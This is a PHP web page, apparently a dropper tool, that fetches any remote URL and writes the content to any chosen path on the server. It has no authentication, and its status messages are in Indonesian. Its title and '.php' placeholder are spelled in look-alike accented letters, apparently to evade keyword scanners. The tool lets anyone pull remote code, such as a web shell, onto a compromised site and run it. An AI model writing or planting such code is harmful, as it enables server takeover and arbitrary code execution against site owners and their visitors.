<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ŪPĹŌĀĐ VĪĀ ĹĨŅĶ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 50%;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            color: #333;
        }

        form {
            margin-top: 20px;
        }

        input[type="text"] {
            padding: 10px;
            width: 80%;
            margin-bottom: 10px;
        }

        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #45a049;
        }

        .output {
            margin-top: 20px;
            text-align: left;
            padding: 10px;
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ŪPĹŌĀĐ VĪĀ ĹĨŅĶ</h1>
        <form action="" method="post">
            <label for="url">File URL:</label><br>
            <input type="text" id="url" name="url" value="<?php echo htmlspecialchars($url ?? '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="https://example.com/file.ṖĤṖ" required><br><br>
            <label for="filename">File Name:</label><br>
            <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars($filename ?? '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="filename.ṖĤṖ" required><br><br>
            <label for="path">Directory Path:</label><br>
            <input type="text" id="path" name="path" value="<?php echo htmlspecialchars($path ?? __DIR__, ENT_QUOTES, 'UTF-8'); ?>" placeholder="<?php echo __DIR__; ?>" required><br><br>
            <button type="submit">Upload</button>
        </form>
        <!-- Output section for results -->
        <div class="output">
            <?php
            $output = "";

            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $url = htmlspecialchars($_POST['url'], ENT_QUOTES, 'UTF-8');
                $filename = htmlspecialchars($_POST['filename'], ENT_QUOTES, 'UTF-8');
                $path = htmlspecialchars($_POST['path'], ENT_QUOTES, 'UTF-8');
                if (filter_var($url, FILTER_VALIDATE_URL)) {
                    $file_contents = file_get_contents($url);
                    if ($file_contents !== false) {
                        $file_path = rtrim($path, '/') . '/' . $filename;
                        if (!is_dir($path)) {
                            $output = "<p>Direktori tidak ditemukan: " . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</p>";
                        } else {
                            file_put_contents($file_path, $file_contents);
                            $file_name_only = basename($file_path);
                            $output = "<p>File berhasil diunggah: " . htmlspecialchars($file_name_only, ENT_QUOTES, 'UTF-8') . "</p>";
                        }
                    } else {
                        $output = "<p>Gagal URL yang diberikan</p>";
                    }
                } else {
                    $output = "<p>URL tidak valid</p>";
                }
            }
            echo $output;
            ?>
        </div>
    </div>
</body>

</html>
